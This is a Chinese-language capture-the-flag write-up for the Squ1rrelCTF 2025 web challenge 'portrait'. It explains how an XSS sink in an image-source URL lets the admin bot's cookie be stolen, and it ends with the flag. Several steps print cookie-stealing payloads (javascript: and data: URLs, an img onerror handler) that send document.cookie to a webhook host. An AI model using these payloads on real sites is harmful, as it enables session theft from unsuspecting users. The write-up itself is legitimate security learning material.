##### tags: `Squ1rrelCTF_2025`
# Squ1rrelCTF 2025 Web : portrait

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/ByzmpF7Akx.png)

## <span class="red">前情提要</span>

- **如果這題也和我一樣是在本地 (local) 建置的話，要修改一下 ```docker-compose.yaml```：**
- ![image](https://hackmd.io/_uploads/SyalQp40ye.png)
- **綠色的 code 是原本的，註解是我加上的**

## <span class="red">解題過程 (After Event)</span>

1. **進入靶機後一開始是一個登入業面，打開 DevTools 看到有一個處理前端登入導向的 script ，看到有註冊按鈕所以註冊一個帳號並登入看看**

- ![image](https://hackmd.io/_uploads/Sy8xAK7Ayg.png)
- ![image](https://hackmd.io/_uploads/S1LBAYmAkl.png)
- ![image](https://hackmd.io/_uploads/rycLAYXR1x.png)

&emsp;

2. **我帳號和密碼都用 ```123``` 進行註冊，這時會跳 Login failed ，無法從前端判斷原因，所以查看題目給的 source code 。在 ```src/index.js``` 中可以發現，因為 username 長度不足 6 導致 ```status code = 400``` 而彈出 Login failed**

- ![image](https://hackmd.io/_uploads/H1_fJq7Akl.png)
- ![image](https://hackmd.io/_uploads/BJdfx9mR1g.png)
- ![image](https://hackmd.io/_uploads/SkC2l5Q0kx.png)

&emsp;

3. **於是我將帳號改為 123456 ，密碼維持不變 (=123)，註冊成功就會直接進到 
```Your Portraits``` 的頁面，會發現有可以上傳 (Add a Portraits) 或是檢舉 (Report a Portraits) 的按鈕。為了節省時間，我直接觀察了一下給的 code ，發現有給 bot 並且 bot 身上會帶著有 flag 的 cookie ，結合題目一開始說如果 report a gallery 會讓 admin bot 去訪問該 gallery ，所以猜測是利用某些漏洞來偷取 bot 的 cookie**

- ![image](https://hackmd.io/_uploads/HkOgG5mA1e.png)
- ![image](https://hackmd.io/_uploads/BJzmGcmCke.png)
- ![image](https://hackmd.io/_uploads/SJKRvcmRke.png)
- ![image](https://hackmd.io/_uploads/B1v7O5XCkl.png)

&emsp;

4. **檢查 ```bot.js``` 後就能夠發現，這題應該是 ```XSS``` ，在綜合 step3 的觀察，目標應該是利用 ```XSS``` 把 admin 的 cookie 藉由 webhook 偷到手。確認目標後，因為是 ```XSS``` 所以得先找注入點，因為這題有 ```Add a Portrait``` 的 button ，所以推測這應該是注入點**

- ![image](https://hackmd.io/_uploads/H1qjWimCJe.png)

&emsp;

5. **接著必須查看具體是哪個 part 可以注入。首先找到 ```document.ready``` 的 script (頁面初始化時會跑的 function)，會發現 ```protrait.source``` 和 ```portrait.name``` 都有被 Added as an attribute => 好像都可以打(1.)，但是可以看到在後面(2.) ```portrait.name``` 已經被渲染成 text 了，所以只能攻擊 ```protrait.source``` 的部份**

- ![image](https://hackmd.io/_uploads/SkdK4omAkx.png)

&emsp;

6. **知道要攻擊 ```protrait.source``` 之後，注意到前面的程式碼，針對 ```portrait.source``` 上傳的內容必須要是 URL (或是 URI)，所以不能注入像是：
```<img src=x: onerror="(new Image).src='{attack_server}?'+document.cookie">```
這種 html 類型的 payload**

- ![image](https://hackmd.io/_uploads/Hy1F-nQRye.png)

&emsp;

7. **於是我一開始構建了這樣的 payload ，可以看到 bot 成功訪問的訊息，但是 webhook 並沒有偷到 cookie**
    ```
    Title : XSS1
    URL   : javascript:fetch('https://<your webhook.site>?'+document.cookie)
    ```

- ![image](https://hackmd.io/_uploads/HktYL3V01g.png)
- ![image](https://hackmd.io/_uploads/S1poU34Rkx.png)
- ![image](https://hackmd.io/_uploads/S1ryPhE0yg.png)

&emsp;

8. **會失敗是因為被讀成 img 然後觸發 error ，所以才會在 gallery 的地方看到圖片(那個是預設的圖片)，所以要修改一下 payload：**
    ```
    Title : XSS2
    URL   : data:text/html,<script>fetch('https://<your webhook.site>?'+document.cookie)</script>
    ```
- **```XSS2``` 不行，因為當這段被讀成 img 時， html 就已經不會進行渲染了，也就是說後面部分的 js 不會被成功執行到，所以改成以下這種 payload**

    ```
    Title : XSS3
    URL   : data:text/javascript,fetch('https://<your webhook.site>?'+document.cookie)
    ```

- **被讀成圖片的 code：**
- ![image](https://hackmd.io/_uploads/HkBSunEAkx.png)

- **打開圖片(讀圖片的 URL )時如果有錯誤的處理邏輯：**
- ![image](https://hackmd.io/_uploads/SJa5F2EC1x.png)

&emsp;

9. **成功訪問後(如果 payload 是對的)去 webhook.site 就能看到 flag 了**

- ![image](https://hackmd.io/_uploads/H10lN2EAke.png)
- ![image](https://hackmd.io/_uploads/B1kD43NRyl.png)

&emsp;

10. **趁題目靶機還未被關閉去抓 flag**

- ![image](https://hackmd.io/_uploads/B11szxHRJg.png)
- ![image](https://hackmd.io/_uploads/H1IpGlBA1g.png)
- flag🚩 : squ1rrel{unc_s747us_jqu3ry_l0wk3y_take_two_new_flag_check_this_out_guys}